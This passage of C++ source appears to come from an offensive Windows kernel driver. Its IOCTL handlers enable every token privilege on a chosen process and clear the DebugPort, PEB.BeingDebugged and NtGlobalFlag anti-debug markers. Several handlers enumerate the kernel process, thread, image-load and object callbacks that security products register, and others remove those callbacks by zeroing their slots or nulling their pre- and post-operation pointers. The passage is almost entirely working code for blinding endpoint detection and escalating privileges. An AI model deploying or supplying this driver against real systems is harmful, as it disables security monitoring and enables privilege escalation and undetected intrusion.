		(PPROCESS_PRIVILEGES)((ULONG_PTR)pToken + PROCESS_PRIVILEGE_OFFSET[windowsVersion]);

	// Enable all privileges
	tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = tokenPrivs->EnabledByDefault[0] = 0xff;
	tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = tokenPrivs->EnabledByDefault[1] = 0xff;
	tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = tokenPrivs->EnabledByDefault[2] = 0xff;
	tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = tokenPrivs->EnabledByDefault[3] = 0xff;
	tokenPrivs->Present[4] = tokenPrivs->Enabled[4] = tokenPrivs->EnabledByDefault[4] = 0xff;

	PsDereferencePrimaryToken(pToken);
	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "All privileges enabled for PID %d\n", request->ProcessId));
	return STATUS_SUCCESS;
}

NTSTATUS HandleClearDebugFlags(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for anti-debug\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(TargetProcessRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (TargetProcessRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Get EPROCESS
	PEPROCESS eProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)request->ProcessId, &eProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint((DRIVER_PREFIX "PsLookupProcessByProcessId failed for PID %d (0x%X)\n",
			request->ProcessId, status));
		return status;
	}

	KdPrint((DRIVER_PREFIX "Clearing debug flags for process PID %d\n", request->ProcessId));

	// 1. Clear DebugPort in EPROCESS (kernel debugger detection)
	PVOID* pDebugPort = (PVOID*)((ULONG_PTR)eProcess + PROCESS_DEBUGPORT_OFFSET[windowsVersion]);
	PVOID oldDebugPort = *pDebugPort;
	*pDebugPort = NULL;
	KdPrint((DRIVER_PREFIX "DebugPort cleared (was: 0x%p, now: NULL)\n", oldDebugPort));

	// 2. Get PEB from EPROCESS
	PVOID pPeb = *(PVOID*)((ULONG_PTR)eProcess + PROCESS_PEB_OFFSET[windowsVersion]);
	if (pPeb && (ULONG_PTR)pPeb > 0x1000 && (ULONG_PTR)pPeb < 0x7FFFFFFFFFFF)  // Sanity check: valid usermode address
	{
		// Attach to target process context to safely access PEB
		KAPC_STATE apcState;
		KeStackAttachProcess(eProcess, &apcState);

		__try
		{
			// PEB.BeingDebugged is at offset 0x002
			PUCHAR pBeingDebugged = (PUCHAR)((ULONG_PTR)pPeb + 0x002);
			UCHAR oldBeingDebugged = *pBeingDebugged;
			*pBeingDebugged = FALSE;
			KdPrint((DRIVER_PREFIX "PEB.BeingDebugged cleared (was: %d, now: 0)\n", oldBeingDebugged));

			// PEB.NtGlobalFlag is at offset 0x0BC (x64) or 0x068 (x86)
			// Clearing heap debugging flags
#ifdef _WIN64
			PULONG pNtGlobalFlag = (PULONG)((ULONG_PTR)pPeb + 0x0BC);
#else
			PULONG pNtGlobalFlag = (PULONG)((ULONG_PTR)pPeb + 0x068);
#endif
			ULONG oldNtGlobalFlag = *pNtGlobalFlag;
			// Clear heap debug flags (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
			*pNtGlobalFlag &= ~(0x10 | 0x20 | 0x40);
			KdPrint((DRIVER_PREFIX "PEB.NtGlobalFlag cleared (was: 0x%X, now: 0x%X)\n",
				oldNtGlobalFlag, *pNtGlobalFlag));
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint((DRIVER_PREFIX "Exception while accessing PEB (0x%08X)\n", GetExceptionCode()));
			status = STATUS_ACCESS_VIOLATION;
		}

		KeUnstackDetachProcess(&apcState);
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Warning: Invalid PEB address (0x%p)\n", pPeb));
	}

	ObDereferenceObject(eProcess);
	KdPrint((DRIVER_PREFIX "Anti-debug completed for PID %d\n", request->ProcessId));
	return status;
}

// ============== Callback Enumeration Handlers ==============

NTSTATUS HandleEnumProcessCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating process callbacks\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for callback enumeration\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(CallbackInformation) * MAX_CALLBACK_ENTRIES;

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto userBuffer = (CallbackInformation*)Irp->AssociatedIrp.SystemBuffer;
	if (!userBuffer)
	{
		return STATUS_INVALID_PARAMETER;
	}

	// Find the callback array
	ULONG64 pspSetCreateProcessNotifyArray = FindPspSetCreateProcessNotifyRoutine(windowsVersion);
	if (pspSetCreateProcessNotifyArray == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to locate callback array\n"));
		return STATUS_NOT_FOUND;
	}

	// Zero the output buffer
	RtlZeroMemory(userBuffer, requiredSize);

	// Enumerate all 64 callback slots (PCKC style)
	ULONG validCallbackCount = 0;
	for (ULONG i = 0; i < MAX_CALLBACK_ENTRIES; i++)
	{
		// Each callback is 8 bytes (pointer) on x64
		ULONG64 pCallbackSlot = pspSetCreateProcessNotifyArray + (i * 8);
		ULONG64 callbackEntry = 0;

		__try
		{
			callbackEntry = *(PULONG64)(pCallbackSlot);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint((DRIVER_PREFIX "Exception reading callback slot %d\n", i));
			continue;
		}

		// Always set the index
		userBuffer[i].Index = i;

		// Check if callback entry is valid (PCKC style: MmIsAddressValid check)
		if (callbackEntry == 0 || !MmIsAddressValid((PVOID)callbackEntry))
		{
			continue;
		}

		// Windows stores callbacks with flags in low 3 bits
		// Clear the flags to get the actual structure pointer (PCKC style)
		ULONG64 callbackStructure = callbackEntry & 0xFFFFFFFFFFFFFFF8;

		// The structure points to an EX_CALLBACK_ROUTINE_BLOCK
		// The actual function pointer is at offset 0x0 in this structure
		ULONG64 actualCallbackFunction = 0;

		__try
		{
			// Dereference the structure to get the actual callback function
			actualCallbackFunction = *(PULONG64)(callbackStructure);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			KdPrint((DRIVER_PREFIX "Exception dereferencing callback structure at 0x%llX\n", callbackStructure));
			// Store the structure address as fallback
			actualCallbackFunction = callbackStructure;
		}

		// Store the actual function address
		userBuffer[i].CallbackAddress = actualCallbackFunction;

		// Resolve which driver owns this callback
		SearchLoadedModules(&userBuffer[i]);

		validCallbackCount++;
		KdPrint((DRIVER_PREFIX "[%d] ProcessCallback: 0x%llX (%s+0x%llX)\n",
			i, actualCallbackFunction, userBuffer[i].ModuleName, userBuffer[i].ModuleOffset));
	}

	KdPrint((DRIVER_PREFIX "Found %d active process callbacks\n", validCallbackCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumThreadCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating thread callbacks\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(CallbackInformation) * MAX_CALLBACK_ENTRIES;

	if (outputLen < requiredSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto userBuffer = (CallbackInformation*)Irp->AssociatedIrp.SystemBuffer;
	if (!userBuffer)
	{
		return STATUS_INVALID_PARAMETER;
	}

	ULONG64 callbackArray = FindPspCreateThreadNotifyRoutine(windowsVersion);
	if (callbackArray == 0)
	{
		return STATUS_NOT_FOUND;
	}

	RtlZeroMemory(userBuffer, requiredSize);

	ULONG validCount = 0;
	for (ULONG i = 0; i < MAX_CALLBACK_ENTRIES; i++)
	{
		ULONG64 callbackEntry = 0;
		__try { callbackEntry = *(PULONG64)(callbackArray + (i * 8)); }
		__except (EXCEPTION_EXECUTE_HANDLER) { continue; }

		// Always set the index
		userBuffer[i].Index = i;

		// Check if callback entry is valid (TCKC style: MmIsAddressValid check)
		if (callbackEntry == 0 || !MmIsAddressValid((PVOID)callbackEntry))
		{
			continue;
		}

		// Mask off low 3 bits and dereference to get actual callback function (TCKC style)
		ULONG64 actualFunction = 0;
		__try { actualFunction = *(PULONG64)(callbackEntry & 0xFFFFFFFFFFFFFFF8); }
		__except (EXCEPTION_EXECUTE_HANDLER) { actualFunction = callbackEntry & 0xFFFFFFFFFFFFFFF8; }

		userBuffer[i].CallbackAddress = actualFunction;
		SearchLoadedModules(&userBuffer[i]);
		validCount++;

		KdPrint((DRIVER_PREFIX "[%d] ThreadCallback: 0x%llX (%s+0x%llX)\n",
			i, actualFunction, userBuffer[i].ModuleName, userBuffer[i].ModuleOffset));
	}

	KdPrint((DRIVER_PREFIX "Found %d active thread callbacks\n", validCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumImageCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating image load callbacks\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(CallbackInformation) * MAX_CALLBACK_ENTRIES;

	if (outputLen < requiredSize)
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto userBuffer = (CallbackInformation*)Irp->AssociatedIrp.SystemBuffer;
	if (!userBuffer)
	{
		return STATUS_INVALID_PARAMETER;
	}

	ULONG64 callbackArray = FindPspLoadImageNotifyRoutine(windowsVersion);
	if (callbackArray == 0)
	{
		return STATUS_NOT_FOUND;
	}

	RtlZeroMemory(userBuffer, requiredSize);

	ULONG validCount = 0;
	for (ULONG i = 0; i < MAX_CALLBACK_ENTRIES; i++)
	{
		ULONG64 callbackEntry = 0;
		__try { callbackEntry = *(PULONG64)(callbackArray + (i * 8)); }
		__except (EXCEPTION_EXECUTE_HANDLER) { continue; }

		// Always set the index
		userBuffer[i].Index = i;

		// Check if callback entry is valid (ILCK style: MmIsAddressValid check)
		if (callbackEntry == 0 || !MmIsAddressValid((PVOID)callbackEntry))
		{
			continue;
		}

		// Mask off low 3 bits and dereference to get actual callback function (ILCK style)
		ULONG64 actualFunction = 0;
		__try { actualFunction = *(PULONG64)(callbackEntry & 0xFFFFFFFFFFFFFFF8); }
		__except (EXCEPTION_EXECUTE_HANDLER) { actualFunction = callbackEntry & 0xFFFFFFFFFFFFFFF8; }

		userBuffer[i].CallbackAddress = actualFunction;
		SearchLoadedModules(&userBuffer[i]);
		validCount++;

		KdPrint((DRIVER_PREFIX "[%d] ImageLoadCallback: 0x%llX (%s+0x%llX)\n",
			i, actualFunction, userBuffer[i].ModuleName, userBuffer[i].ModuleOffset));
	}

	KdPrint((DRIVER_PREFIX "Found %d active image load callbacks\n", validCount));
	*info = requiredSize;
	return STATUS_SUCCESS;
}

// ============== Callback Removal Handlers ==============

NTSTATUS HandleRemoveProcessCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveProcessCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveCallbackRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small\n"));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		KdPrint((DRIVER_PREFIX "Invalid parameter: index=%d\n", request ? request->Index : 0));
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG64 arrayAddress = FindPspSetCreateProcessNotifyRoutine(windowsVersion);
	if (arrayAddress == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to find PspSetCreateProcessNotifyRoutine array\n"));
		return STATUS_NOT_FOUND;
	}

	// Calculate slot address
	ULONG64 slotAddress = arrayAddress + (request->Index * 8);

	// Zero out the callback slot using RtlZeroMemory (TCKC style)
	__try
	{
		ULONG64 slotValue = *(PULONG64)slotAddress;
		if (slotValue == 0)
		{
			KdPrint((DRIVER_PREFIX "Process callback slot %d is already empty\n", request->Index));
			return STATUS_SUCCESS;
		}

		// Validate the slot contains a valid pointer before removal
		if (!MmIsAddressValid((PVOID)slotValue))
		{
			KdPrint((DRIVER_PREFIX "Process callback slot %d contains invalid address 0x%llX\n", request->Index, slotValue));
			return STATUS_INVALID_ADDRESS;
		}

		// Dereference to get actual callback address for logging
		ULONG64 callbackAddr = *(PULONG64)(slotValue & 0xFFFFFFFFFFFFFFF8);

		// Save original value for restoration
		g_RemovedProcessCallbacks[request->Index].IsRemoved = TRUE;
		g_RemovedProcessCallbacks[request->Index].OriginalValue = slotValue;
		g_RemovedProcessCallbacks[request->Index].SlotAddress = slotAddress;

		// Zero the slot using RtlZeroMemory (like TCKC)
		RtlZeroMemory((PVOID)slotAddress, sizeof(ULONG64));
		KdPrint((DRIVER_PREFIX "Removed process callback at index %d (callback was 0x%llX, saved for restore)\n", request->Index, callbackAddr));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing process callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRemoveThreadCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveThreadCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG64 arrayAddress = FindPspCreateThreadNotifyRoutine(windowsVersion);
	if (arrayAddress == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to find PspCreateThreadNotifyRoutine array\n"));
		return STATUS_NOT_FOUND;
	}

	ULONG64 slotAddress = arrayAddress + (request->Index * 8);

	// Zero out the callback slot using RtlZeroMemory (TCKC style)
	__try
	{
		ULONG64 slotValue = *(PULONG64)slotAddress;
		if (slotValue == 0)
		{
			KdPrint((DRIVER_PREFIX "Thread callback slot %d is already empty\n", request->Index));
			return STATUS_SUCCESS;
		}

		// Validate the slot contains a valid pointer before removal
		if (!MmIsAddressValid((PVOID)slotValue))
		{
			KdPrint((DRIVER_PREFIX "Thread callback slot %d contains invalid address 0x%llX\n", request->Index, slotValue));
			return STATUS_INVALID_ADDRESS;
		}

		// Dereference to get actual callback address for logging
		ULONG64 callbackAddr = *(PULONG64)(slotValue & 0xFFFFFFFFFFFFFFF8);

		// Save original value for restoration
		g_RemovedThreadCallbacks[request->Index].IsRemoved = TRUE;
		g_RemovedThreadCallbacks[request->Index].OriginalValue = slotValue;
		g_RemovedThreadCallbacks[request->Index].SlotAddress = slotAddress;

		// Zero the slot using RtlZeroMemory (like TCKC)
		RtlZeroMemory((PVOID)slotAddress, sizeof(ULONG64));
		KdPrint((DRIVER_PREFIX "Removed thread callback at index %d (callback was 0x%llX, saved for restore)\n", request->Index, callbackAddr));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing thread callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleRemoveImageCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveImageCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveCallbackRequest))
	{
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request || request->Index >= MAX_CALLBACK_ENTRIES)
	{
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG64 arrayAddress = FindPspLoadImageNotifyRoutine(windowsVersion);
	if (arrayAddress == 0)
	{
		KdPrint((DRIVER_PREFIX "Failed to find PspLoadImageNotifyRoutine array\n"));
		return STATUS_NOT_FOUND;
	}

	ULONG64 slotAddress = arrayAddress + (request->Index * 8);

	// Zero out the callback slot using RtlZeroMemory (TCKC style)
	__try
	{
		ULONG64 slotValue = *(PULONG64)slotAddress;
		if (slotValue == 0)
		{
			KdPrint((DRIVER_PREFIX "Image callback slot %d is already empty\n", request->Index));
			return STATUS_SUCCESS;
		}

		// Validate the slot contains a valid pointer before removal
		if (!MmIsAddressValid((PVOID)slotValue))
		{
			KdPrint((DRIVER_PREFIX "Image callback slot %d contains invalid address 0x%llX\n", request->Index, slotValue));
			return STATUS_INVALID_ADDRESS;
		}

		// Dereference to get actual callback address for logging
		ULONG64 callbackAddr = *(PULONG64)(slotValue & 0xFFFFFFFFFFFFFFF8);

		// Save original value for restoration
		g_RemovedImageCallbacks[request->Index].IsRemoved = TRUE;
		g_RemovedImageCallbacks[request->Index].OriginalValue = slotValue;
		g_RemovedImageCallbacks[request->Index].SlotAddress = slotAddress;

		// Zero the slot using RtlZeroMemory (like TCKC)
		RtlZeroMemory((PVOID)slotAddress, sizeof(ULONG64));
		KdPrint((DRIVER_PREFIX "Removed image callback at index %d (callback was 0x%llX, saved for restore)\n", request->Index, callbackAddr));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing image callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

// ============== Object Callback Removal (OCKC style) ==============

NTSTATUS HandleRemoveObjectCallback(PIRP Irp, PIO_STACK_LOCATION irpSp)
{
	KdPrint((DRIVER_PREFIX "HandleRemoveObjectCallback called\n"));

	auto inputLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	if (inputLen < sizeof(RemoveObjectCallbackRequest))
	{
		KdPrint((DRIVER_PREFIX "Buffer too small\n"));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto request = (RemoveObjectCallbackRequest*)Irp->AssociatedIrp.SystemBuffer;
	if (!request)
	{
		KdPrint((DRIVER_PREFIX "Invalid parameter: null request\n"));
		return STATUS_INVALID_PARAMETER;
	}

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		return STATUS_NOT_SUPPORTED;
	}

	ULONG callbackListOffset = OBJECT_TYPE_CALLBACKLIST_OFFSET[windowsVersion];
	POBJECT_TYPE objectType = nullptr;

	// Select the correct object type based on request
	if (request->ObjectType == ObjectCallbackProcess)
	{
		objectType = *PsProcessType;
		KdPrint((DRIVER_PREFIX "Removing from Process object callbacks\n"));
	}
	else if (request->ObjectType == ObjectCallbackThread)
	{
		objectType = *PsThreadType;
		KdPrint((DRIVER_PREFIX "Removing from Thread object callbacks\n"));
	}
	else
	{
		KdPrint((DRIVER_PREFIX "Invalid object type: %d\n", request->ObjectType));
		return STATUS_INVALID_PARAMETER;
	}

	if (!objectType)
	{
		KdPrint((DRIVER_PREFIX "Failed to get object type\n"));
		return STATUS_NOT_FOUND;
	}

	__try
	{
		// Get CallbackList at offset in _OBJECT_TYPE
		PLIST_ENTRY callbackListHead = (PLIST_ENTRY)((ULONG_PTR)objectType + callbackListOffset);
		PLIST_ENTRY entry = callbackListHead->Flink;
		ULONG currentIndex = 0;
		BOOLEAN found = FALSE;

		// Walk the callback list to find the entry by index
		while (entry != callbackListHead)
		{
			if (currentIndex == request->Index)
			{
				PCALLBACK_ENTRY_ITEM callbackItem = CONTAINING_RECORD(entry, CALLBACK_ENTRY_ITEM, EntryItemList);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					// Select the correct storage array based on object type
					RemovedObjectCallback* storage = (request->ObjectType == ObjectCallbackProcess)
						? g_RemovedProcessObjectCallbacks
						: g_RemovedThreadObjectCallbacks;

					// Save the callback entry pointer for restoration
					storage[request->Index].CallbackEntryItem = callbackItem;
					storage[request->Index].IsRemoved = TRUE;

					// Remove PreOperation callback using InterlockedExchangePointer (OCKC style)
					if (request->RemovePreOperation && callbackItem->PreOperation)
					{
						// Save original PreOperation for restoration
						storage[request->Index].PreOperation = callbackItem->PreOperation;
						KdPrint((DRIVER_PREFIX "Removing PreOperation callback at 0x%llX (saved for restore)\n",
							(ULONG64)callbackItem->PreOperation));
						InterlockedExchangePointer((PVOID*)&callbackItem->PreOperation, NULL);
					}

					// Remove PostOperation callback using InterlockedExchangePointer (OCKC style)
					if (request->RemovePostOperation && callbackItem->PostOperation)
					{
						// Save original PostOperation for restoration
						storage[request->Index].PostOperation = callbackItem->PostOperation;
						KdPrint((DRIVER_PREFIX "Removing PostOperation callback at 0x%llX (saved for restore)\n",
							(ULONG64)callbackItem->PostOperation));
						InterlockedExchangePointer((PVOID*)&callbackItem->PostOperation, NULL);
					}

					found = TRUE;
					KdPrint((DRIVER_PREFIX "Successfully removed object callback at index %d\n", request->Index));
				}
				break;
			}

			currentIndex++;
			entry = entry->Flink;
		}

		if (!found)
		{
			KdPrint((DRIVER_PREFIX "Callback at index %d not found\n", request->Index));
			return STATUS_NOT_FOUND;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "Exception while removing object callback at index %d\n", request->Index));
		return STATUS_ACCESS_VIOLATION;
	}

	return STATUS_SUCCESS;
}

NTSTATUS HandleEnumObjectCallbacks(PIRP Irp, PIO_STACK_LOCATION irpSp, PULONG_PTR info)
{
	KdPrint((DRIVER_PREFIX "Enumerating object callbacks (ObRegisterCallbacks)\n"));

	WINDOWS_VERSION windowsVersion = GetWindowsVersion();
	if (windowsVersion == WINDOWS_UNSUPPORTED)
	{
		KdPrint((DRIVER_PREFIX "Windows version unsupported for object callback enumeration\n"));
		return STATUS_NOT_SUPPORTED;
	}

	auto outputLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;
	ULONG requiredSize = sizeof(EnumObjectCallbacksResponse) +
		(sizeof(ObjectCallbackInfo) * (MAX_OBJECT_CALLBACK_ENTRIES - 1));

	if (outputLen < requiredSize)
	{
		KdPrint((DRIVER_PREFIX "Buffer too small (need %d bytes, got %d)\n", requiredSize, outputLen));
		return STATUS_BUFFER_TOO_SMALL;
	}

	auto response = (EnumObjectCallbacksResponse*)Irp->AssociatedIrp.SystemBuffer;
	if (!response)
	{
		return STATUS_INVALID_PARAMETER;
	}

	RtlZeroMemory(response, requiredSize);

	ULONG callbackCount = 0;
	ULONG callbackListOffset = OBJECT_TYPE_CALLBACKLIST_OFFSET[windowsVersion];
	NTSTATUS status = STATUS_SUCCESS;

	// Enumerate Process object callbacks
	__try
	{
		// Get the Process object type
		POBJECT_TYPE processType = *PsProcessType;
		if (processType)
		{
			KdPrint((DRIVER_PREFIX "Process ObjectType at 0x%p\n", processType));

			// Get CallbackList at offset in _OBJECT_TYPE
			PLIST_ENTRY callbackListHead = (PLIST_ENTRY)((ULONG_PTR)processType + callbackListOffset);
			KdPrint((DRIVER_PREFIX "Process CallbackList head at 0x%p\n", callbackListHead));

			// Walk the callback list
			PLIST_ENTRY entry = callbackListHead->Flink;
			while (entry != callbackListHead && callbackCount < MAX_OBJECT_CALLBACK_ENTRIES)
			{
				// Entry points to EntryItemList in CALLBACK_ENTRY_ITEM
				PCALLBACK_ENTRY_ITEM callbackItem = CONTAINING_RECORD(entry, CALLBACK_ENTRY_ITEM, EntryItemList);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					ObjectCallbackInfo* cbInfo = &response->Entries[callbackCount];
					cbInfo->ObjectType = ObjectCallbackProcess;
					cbInfo->Operations = (ObjectCallbackOperations)callbackItem->Operations;
					cbInfo->Index = callbackCount;

					// Get Pre/Post operation callbacks
					if (callbackItem->PreOperation && MmIsAddressValid(callbackItem->PreOperation))
					{
						cbInfo->PreOperationCallback = (ULONG64)callbackItem->PreOperation;
					}
					if (callbackItem->PostOperation && MmIsAddressValid(callbackItem->PostOperation))
					{
						cbInfo->PostOperationCallback = (ULONG64)callbackItem->PostOperation;
					}

					// Get altitude from parent CALLBACK_ENTRY
					if (callbackItem->CallbackEntry && MmIsAddressValid(callbackItem->CallbackEntry))
					{
						PCALLBACK_ENTRY callbackEntry = callbackItem->CallbackEntry;
						if (callbackEntry->AltitudeString && MmIsAddressValid(callbackEntry->AltitudeString))
						{
							// Convert altitude to ANSI
							UNICODE_STRING altitudeUnicode;
							altitudeUnicode.Buffer = callbackEntry->AltitudeString;
							altitudeUnicode.Length = callbackEntry->AltitudeLength1;
							altitudeUnicode.MaximumLength = callbackEntry->AltitudeLength2;

							ANSI_STRING altitudeAnsi;
							altitudeAnsi.Buffer = cbInfo->Altitude;
							altitudeAnsi.Length = 0;
							altitudeAnsi.MaximumLength = MAX_ALTITUDE_LENGTH - 1;

							RtlUnicodeStringToAnsiString(&altitudeAnsi, &altitudeUnicode, FALSE);
						}
					}

					// Resolve module name and RVA offsets (OCKC style)
					if (cbInfo->PreOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PreOperationCallback;
						SearchLoadedModules(&tempInfo);
						RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
						cbInfo->ModuleBase = tempInfo.ModuleBase;
						cbInfo->PreOperationOffset = tempInfo.ModuleOffset;
					}
					if (cbInfo->PostOperationCallback)
					{
						CallbackInformation tempInfo = { 0 };
						tempInfo.CallbackAddress = cbInfo->PostOperationCallback;
						SearchLoadedModules(&tempInfo);
						// If we don't have a module name yet, use this one
						if (cbInfo->ModuleName[0] == '\0')
						{
							RtlCopyMemory(cbInfo->ModuleName, tempInfo.ModuleName, MAX_MODULE_NAME_LENGTH);
							cbInfo->ModuleBase = tempInfo.ModuleBase;
						}
						cbInfo->PostOperationOffset = tempInfo.ModuleOffset;
					}

					KdPrint((DRIVER_PREFIX "[%d] ProcessObjCallback: Pre=0x%llX(+0x%llX) Post=0x%llX(+0x%llX) -> %s (Alt: %s)\n",
						callbackCount, cbInfo->PreOperationCallback, cbInfo->PreOperationOffset,
						cbInfo->PostOperationCallback, cbInfo->PostOperationOffset,
						cbInfo->ModuleName, cbInfo->Altitude));

					callbackCount++;
				}

				entry = entry->Flink;
			}
		}

		// Enumerate Thread object callbacks
		POBJECT_TYPE threadType = *PsThreadType;
		if (threadType)
		{
			KdPrint((DRIVER_PREFIX "Thread ObjectType at 0x%p\n", threadType));

			PLIST_ENTRY callbackListHead = (PLIST_ENTRY)((ULONG_PTR)threadType + callbackListOffset);
			KdPrint((DRIVER_PREFIX "Thread CallbackList head at 0x%p\n", callbackListHead));

			PLIST_ENTRY entry = callbackListHead->Flink;
			while (entry != callbackListHead && callbackCount < MAX_OBJECT_CALLBACK_ENTRIES)
			{
				PCALLBACK_ENTRY_ITEM callbackItem = CONTAINING_RECORD(entry, CALLBACK_ENTRY_ITEM, EntryItemList);

				if (callbackItem && MmIsAddressValid(callbackItem))
				{
					ObjectCallbackInfo* cbInfo = &response->Entries[callbackCount];
					cbInfo->ObjectType = ObjectCallbackThread;
					cbInfo->Operations = (ObjectCallbackOperations)callbackItem->Operations;
					cbInfo->Index = callbackCount;

					if (callbackItem->PreOperation && MmIsAddressValid(callbackItem->PreOperation))
					{
						cbInfo->PreOperationCallback = (ULONG64)callbackItem->PreOperation;
					}
					if (callbackItem->PostOperation && MmIsAddressValid(callbackItem->PostOperation))
					{
						cbInfo->PostOperationCallback = (ULONG64)callbackItem->PostOperation;
					}

					if (callbackItem->CallbackEntry && MmIsAddressValid(callbackItem->CallbackEntry))
					{
						PCALLBACK_ENTRY callbackEntry = callbackItem->CallbackEntry;
						if (callbackEntry->AltitudeString && MmIsAddressValid(callbackEntry->AltitudeString))
						{
							UNICODE_STRING altitudeUnicode;
							altitudeUnicode.Buffer = callbackEntry->AltitudeString;
							altitudeUnicode.Length = callbackEntry->AltitudeLength1;
							altitudeUnicode.MaximumLength = callbackEntry->AltitudeLength2;

